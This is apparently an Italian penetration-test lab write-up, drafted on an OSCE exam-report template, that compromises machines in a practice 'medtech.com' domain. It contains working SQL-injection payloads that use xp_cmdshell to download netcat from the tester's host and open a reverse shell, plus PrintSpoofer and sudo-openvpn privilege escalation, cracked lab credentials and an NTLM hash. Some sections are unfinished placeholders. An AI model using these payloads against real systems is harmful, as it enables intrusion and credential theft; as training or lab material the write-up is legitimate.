---
title: "Offensive Security Certified Expert Exam Report"
author: ["student@youremailaddress.com", "OSID: XXXX"]
date: "2020-07-25"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCE Exam Report"
lang: "en"
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Intro

The Offensive Security OSCE exam documentation contains all efforts that were conducted in order to pass the Offensive Security Certified Expert exam. This report will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has the technical knowledge required to pass the qualifications for the Offensive Security Certified Expert certification.
The student will be required to fill out this exam documentation fully and to include the following sections:

- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable.
- Any additional items that were not included

# 172.16.184.10 - DC01 {pwned:proof}

```bash
nmap -sC -sV -O -p- 172.16.184.10
```

```bash
Nmap scan report for 172.16.184.10 (172.16.184.10)
Host is up (0.024s latency).
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-18 11:23:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: medtech.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: medtech.com0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
60998/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61003/tcp open  msrpc         Microsoft Windows RPC
61014/tcp open  msrpc         Microsoft Windows RPC
61029/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): IBM z/OS 1.11.X (85%)
OS CPE: cpe:/o:ibm:zos:1.11
Aggressive OS guesses: IBM z/OS 1.11 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:c5:cb (VMware)
| smb2-time: 
|   date: 2024-05-18T11:25:42
|_  start_date: N/A
|_clock-skew: 1s
```

```bash
evil-winrm -i 172.16.220.10 -u 'leon' -p 'rabbit:)'
```

# 172.16.184.11 - FILES02 {pwned:local&proof}

```bash
nmap -sC -sV -O -p- 172.16.184.11
```

```bash
Nmap scan report for 172.16.184.11 (172.16.184.11)
Host is up (0.023s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1s
|_nbstat: NetBIOS name: FILES02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:c4:e3 (VMware)
| smb2-time: 
|   date: 2024-05-18T10:59:38
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Con le credenziali trovate precedentemente lancio il seguente comando:

```bash
smbclient -N -L //172.16.184.11/ -U medtech.com/joe%Flowers1 
```

```bash
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C               Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        TEMP            Disk      
```

Successivamente lancio questo comando per esplorare lo share C:

```bash
smbclient \\\\172.16.184.11\\C -U medtech.com/joe%Flowers1
```

Nella cartella desktop dell'utente joe trovo la flag local.txt e in quella dell'utente Administrator trovo la flag proof.txt.

Ottengo una shell attraverso questo comando:

```bash
/usr/share/doc/python3-impacket/examples/psexec.py -port 445 medtech.com/joe:Flowers1@172.16.184.11 
```

Trovo un file nel quali sono contenuti diversi hash NTLM:

![](/OSCP/Immagini_OSCP/Medtech/11_NTLM_hash.png)

Tramite hashcat recupero la password per l'utente wario:

```bash
fdf36048c1cf88f5630381c5e38feb8e:Mushroom!
```


# 172.16.184.12 - DEV04 {pwned:local&proof}

```bash
nmap -sC -sV -O -p- 172.16.184.12
```

```bash
Nmap scan report for 172.16.184.12 (172.16.184.12)
Host is up (0.031s latency).
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DEV04.medtech.com
| Not valid before: 2024-04-16T20:19:52
|_Not valid after:  2024-10-16T20:19:52
|_ssl-date: 2024-05-18T11:26:24+00:00; +3s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: MEDTECH
|   NetBIOS_Domain_Name: MEDTECH
|   NetBIOS_Computer_Name: DEV04
|   DNS_Domain_Name: medtech.com
|   DNS_Computer_Name: DEV04.medtech.com
|   DNS_Tree_Name: medtech.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-18T11:25:42+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: DEV04, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:d0:51 (VMware)
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2024-05-18T11:25:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

Lancio questo comando per capire se ho la possibilità di entrare tramite rdp su questa macchina:

```bash
sudo crackmapexec smb 172.16.220.12 -u user.txt -p passwords.txt -M rdp -o ACTION=enable --continue-on-success
```

Scopro che l'utente yoshi può connettersi tramite rdp:

```bash
xfreerdp /u:yoshi /d:medtech.com  /v:172.16.220.12 
```

Sul desktop dell'user yoshi trovo la flag local.txt.

C'è un file backup.exe sul quale eseguire ...

Qui trovo la vera password di leon:

```bash
leon:rabbit:)
```


# 172.16.184.13 - PROD01 {pwned:proof}

```bash
nmap -sC -sV -O -p- 172.16.184.13
```

```bash
Nmap scan report for 172.16.184.13 (172.16.184.13)
Host is up (0.033s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): IBM z/OS 1.11.X|2.1.X (85%)
OS CPE: cpe:/o:ibm:zos:1.11 cpe:/o:ibm:zos:2.1
Aggressive OS guesses: IBM z/OS 1.11 (85%), IBM z/OS 2.1 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: PROD01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:29:ec (VMware)
| smb2-time: 
|   date: 2024-05-18T11:25:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 2s
```

```bash
evil-winrm -i 172.16.220.10 -u 'leon' -p 'rabbit:)'
```
# 172.16.184.14 {pwned:local}

```bash
nmap -sC -sV -O -p- 172.16.184.14
```

```bash
Nmap scan report for 172.16.184.14 (172.16.184.14)
Host is up (0.023s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|_  3072 eb:0e:77:7c:69:f2:4a:a5:65:2a:1c:ec:ec:6e:79:19 (RSA)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tramite il file id_rsa dell'utente mario trovato sulla macchina 192.168.184.122, riesco ad accedere tramite ssh:

```bash
nmap -sC -sV -O -p- 172.16.184.14
```

E ottengo così la flag local.txt.



# 192.168.171.120 {pwned:proof}

## Proof.txt

Provide the contents of proof.txt.

## Vulnerable Command

Provide the command that was found to be exploitable.

## Vulnerability Identification

Provide the method and code used to find the vulnerability.

## PoC Code

Provide the final proof of concept code used to gain access to the server.

## Steps

Provide a detailed account of your methodology in creating the exploit. The steps taken should be able to be easily followed and reproducible if necessary.

```bash
nmap -sC -sV -O 192.168.171.120
```

```bash
Nmap scan report for 192.168.171.120 (192.168.171.120)
Host is up (0.040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
|_http-title: PAW! (PWK Awesome Website)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/16%OT=22%CT=1%CU=31597%PV=Y%DS=4%DC=I%G=Y%TM=6645
OS:D100%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=100%TI=Z%II=I%TS=A)SEQ(S
OS:P=103%GCD=1%ISR=101%TI=Z%II=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=
OS:M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=4
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=C912%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Visito la pagina http://192.168.171.120:80:

![](/OSCP/Immagini_OSCP/Medtech/192.168.171.120_port80.png)

Ho trovato le credenziali per accedere sulla macchina DC01:

```bash
offsec:century62hisan51
```

# 192.168.xxx.121 - WEB02 {pwned:proof}

## Proof.txt

Provide the contents of proof.txt.

## Vulnerable Command

Provide the command that was found to be exploitable.

## Privilege Escalation

Provide the privilege escalation that was used to gain root on the server.

## PoC Code

Provide the final proof of concept code used to gain access to the server.

## Screenshots

Provide a screenshot of the id command and the contents of proof.txt.

![ImgPlaceholder](img/placeholder-image-300x225.png)

## Steps

Provide a detailed account of your methodology in creating the exploit. The steps taken should be able to be easily followed and reproducible if necessary.

```bash
nmap -sC -sV -O 192.168.171.121
```

```bash
Nmap scan report for 192.168.171.121 (192.168.171.121)
Host is up (0.041s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MedTech
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/16%OT=80%CT=1%CU=41566%PV=Y%DS=4%DC=I%G=Y%TM=6645
OS:D6E0%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=105%TI=I%TS=A)SEQ(SP=107
OS:%GCD=1%ISR=106%TI=I%TS=A)SEQ(SP=107%GCD=1%ISR=107%TI=I%TS=A)OPS(O1=M551N
OS:W8ST11%O2=M551NW8ST11%O3=M551NW8NNT11%O4=M551NW8ST11%O5=M551NW8ST11%O6=M
OS:551ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y
OS:%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=
OS:)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=B5E4%R
OS:UD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-16T09:50:17
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
```

Qui ci sono diverse porte aperte interessanti.

Per prima cosa, visito la pagina http://192.168.171.121:80:

![](/OSCP/Immagini_OSCP/Medtech/192.168.171.121_port80.png)

Scopro l'esistenza di una pagina per il login http://192.168.171.121/login.aspx:

![](/OSCP/Immagini_OSCP/Medtech/192.168.171.121_port80_login.png)

Provo ad accedere utilizzando le credenziali admin:admin, ma nulla da fare.

Allora provo a verificare se uno dei campi del form login è vulnerabile a SQLi.

Dopo vari tentativi, scopro che il campo username sembra essere vulnerabile alla time-based SQLi.

Il payload utilizzato è il seguente:

```bash
ciao'; waitfor delay '0:0:5'--
```

Inserendo questo payload ottengo il risultato "Invalid credentials. Please try again." dopo 5 secondi.

![](/OSCP/Immagini_OSCP/Medtech/192.168.171.121_port80_login_sql.png)

Provo quindi a verificare se è possibile utilizzare la funzione _xp_cmdshel_. Per farlo avvio tcpdump sulla mia macchina per catturare il traffico sull'interfaccia eth0:

```bash
sudo tcpdump -i eth0
```

E utilizzo questo payload:

```bash
ciao'; EXEC xp_cmdshell 'ping 192.168.45.212'; waitfor delay '0:0:5'--
```

Funziona!

![](/OSCP/Immagini_OSCP/Medtech/192.168.171.121_port80_tcpdump_ping.png)

Provo allora scaricare _nc64.exe_ sulla macchina target avviando un server http sylla porta 9999 tramite python sulla mia macchina:

```bash
python3 -m http.server 9999
```

E utilizzo il seguente payload:

```bash
ciao'; EXEC xp_cmdshell 'curl -o C:\windows\temp\nc64.exe http://192.168.45.212:9999/nc64.exe'; waitfor delay '0:0:2'--
```

Una volta scaricato, avvio un listener sulla mia macchina sulla porta 443:

```bash
nc -nvlp 443
```

E utilizzo questo payload per ricavare una reverse-shell:

```bash
ciao'; EXEC xp_cmdshell 'C:\windows\temp\nc64.exe 192.168.45.212 443 -e cmd.exe'; waitfor delay '0:0:2'--
```

Ricavo in questo modo una shell per l'utente nt service\mssql$sqlexpress:

![](/OSCP/Immagini_OSCP/Medtech/192.168.171.121_port80_reverse.png)

Una volta dentro, inizio con la fase di enumeration.

Per prima cosa, lancio il comando systeminfo:

```bash
Host Name:                 WEB02
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00454-10000-00001-AA205
Original Install Date:     9/29/2022, 12:56:59 AM
System Boot Time:          4/17/2024, 12:28:35 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2650 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 1,534 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,080 MB
Virtual Memory: In Use:    2,719 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    medtech.com
Logon Server:              N/A
Hotfix(s):                 4 Hotfix(s) Installed.
                           [01]: KB5017265
                           [02]: KB5012170
                           [03]: KB5017316
                           [04]: KB5016704
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.171.121
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.171.254
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

Lancio il comando ipconfig /all:

```bash
Windows IP Configuration

   Host Name . . . . . . . . . . . . : WEB02
   Primary Dns Suffix  . . . . . . . : dmz.medtech.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : Yes
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : dmz.medtech.com
                                       medtech.com

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-9E-E1-87
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 192.168.164.121(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.164.254
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : 00-50-56-9E-3D-8E
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 172.16.164.254(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   DNS Servers . . . . . . . . . . . : 172.16.164.10
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

Lancio il comando whoami /priv:

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Dato che è settato il privilegio _SeImpersonatePrivilege_, decido di provare ad utilizzare _PrintSpoofer_ per provare a sfruttarlo. Scarico _PrintSpoofer_ sulla mia macchina e lo sposto sulla macchina target attraverso questo comando:

```bash
powershell

iwr -uri http://192.168.45.212:9999/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

Successivamente eseguo _PrintSpoofer_:

```bash
.\PrintSpoofer64.exe -i -c powershell.exe
```

Divento così amministratore di sistema e ottengo la prima proof.txt:

![](/OSCP/Immagini_OSCP/Medtech/192.168.171.121_proof.png)

Continuo con l'enumeration:

```bash
powershell -ep bypass
Import-Module .\PowerView.ps1
```

Get-NetDomain:

```bash
Forest                  : medtech.com
DomainControllers       : {DC01.medtech.com}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : DC01.medtech.com
RidRoleOwner            : DC01.medtech.com
InfrastructureRoleOwner : DC01.medtech.com
Name                    : medtech.com
```

Get-NetUser | select cn,memberof:

```bash
cn            memberof                                                       
---------------------------------------------------------------------------------                                                                                    
Administrator {CN=Group Policy Creator Owners,...

Guest         CN=Guests,CN=Builtin,DC=medtech,DC=com                                                                   
offsec        CN=Users,CN=Builtin,DC=medtech,DC=com                                                                    
krbtgt        CN=Denied RODC Password Replication Group,CN=Users,DC=medtech,DC=com                                     
leon          CN=Domain Admins,CN=Users,DC=medtech,DC=com                                                              
joe           CN=Backup Operators,CN=Builtin,DC=medtech,DC=com                                                         
peach                                                                                                                  
mario                                                                                                                  
wario                                                                                                                  
yoshi  
```

Get-NetGroup | select cn

```bash
cn                                     
--                                     
Administrators                         
Users                                  
Guests                                 
Print Operators                        
Backup Operators                       
Replicator                             
Remote Desktop Users                   
Network Configuration Operators        
Performance Monitor Users              
Performance Log Users                  
Distributed COM Users                  
IIS_IUSRS                              
Cryptographic Operators                
Event Log Readers                      
Certificate Service DCOM Access        
RDS Remote Access Servers              
RDS Endpoint Servers                   
RDS Management Servers                 
Hyper-V Administrators                 
Access Control Assistance Operators    
Remote Management Users                
Storage Replica Administrators         
Domain Computers                       
Domain Controllers                     
Schema Admins                          
Enterprise Admins                      
Cert Publishers                        
Domain Admins                          
Domain Users                           
Domain Guests                          
Group Policy Creator Owners            
RAS and IAS Servers                    
Server Operators                       
Account Operators                      
Pre-Windows 2000 Compatible Access     
Incoming Forest Trust Builders         
Windows Authorization Access Group     
Terminal Server License Servers        
Allowed RODC Password Replication Group
Denied RODC Password Replication Group 
Read-only Domain Controllers           
Enterprise Read-only Domain Controllers
Cloneable Domain Controllers           
Protected Users                        
Key Admins                             
Enterprise Key Admins                  
DnsAdmins                              
DnsUpdateProxy   
```

Get-NetComputer | select operatingsystem,dnshostname:

```bash
operatingsystem              dnshostname          
---------------              -----------          
Windows Server 2022 Standard DC01.medtech.com     
Windows Server 2022 Standard FILES02.medtech.com  
Windows Server 2022 Standard DEV04.medtech.com    
Windows 11 Enterprise        CLIENT01.medtech.com 
Windows Server 2022 Standard PROD01.medtech.com   
Windows 11 Enterprise        CLIENT02.medtech.com 
Windows Server 2022 Standard WEB02.dmz.medtech.com
```

MANCA TUTTA LA PARTE DI MIMIKATZ E TUNNELING CON  LIGONO-NG

Una volta ottenute alcune credenziali provo a lanciare il seguente comando:

```bash
crackmapexec smb 172.16.184.0/24 -u user.txt -p passwords.txt -d medtech.com --continue-on-success | grep "[+]"
```

Ottenendo questo risultato:

![](/OSCP/Immagini_OSCP/Medtech/192.168.171.121_crackmapexec_smb.png)


# 192.168.171.122  {pwned:local&proof.txt}

## Proof.txt

Provide the contents of proof.txt.

## Vulnerable Command

Provide the command that was found to be exploitable.

## Privilege Escalation

Provide the privilege escalation that was used to gain root on the server.

## PoC Code

Provide the final proof of concept code used to gain access to the server.

## Screenshots

Provide a screenshot of the id command and the contents of proof.txt.

![ImgPlaceholder](img/placeholder-image-300x225.png)

## Steps

Provide a detailed account of your methodology in creating the exploit. The steps taken should be able to be easily followed and reproducible if necessary.

```bash
nmap -sC -sV -O 192.168.171.122
```

```bash
Nmap scan report for 192.168.171.122 (192.168.171.122)
Host is up (0.040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.32 or 3.10 (88%), Linux 3.5 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 2.6.39 (87%), Linux 3.10 - 3.12 (87%), Linux 3.4 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Accesso tramite ssh con le seguenti credenziali:

```bash
offsec:password
```

Una volta dentro ottengo la prima flag.

Successivamente, controllo i permessi sudo dell'utente:

```bash
Matching Defaults entries for offsec on vpn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User offsec may run the following commands on vpn:
    (ALL : ALL) /usr/sbin/openvpn
```

Vado su https://gtfobins.github.io/gtfobins/openvpn/#sudo e lancio questo comando:

```
sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
```

Divento root e ottengo la seconda flag.

Nella home c'è la cartella dell'utente mario e al suo interno trovo l'id_rsa dell'utente.

# 172.16.184.82 - CLIENT01 {pwned:proof}

```bash
nmap -sC -sV -O -p- 172.16.184.82
```

```bash
Nmap scan report for 172.16.184.82 (172.16.184.82)
Host is up (0.023s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: MEDTECH
|   NetBIOS_Domain_Name: MEDTECH
|   NetBIOS_Computer_Name: CLIENT01
|   DNS_Domain_Name: medtech.com
|   DNS_Computer_Name: CLIENT01.medtech.com
|   DNS_Tree_Name: medtech.com
|   Product_Version: 10.0.22000
|_  System_Time: 2024-05-18T11:50:39+00:00
| ssl-cert: Subject: commonName=CLIENT01.medtech.com
| Not valid before: 2024-04-16T21:31:12
|_Not valid after:  2024-10-16T21:31:12
|_ssl-date: 2024-05-18T11:51:19+00:00; +3s from scanner time.
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
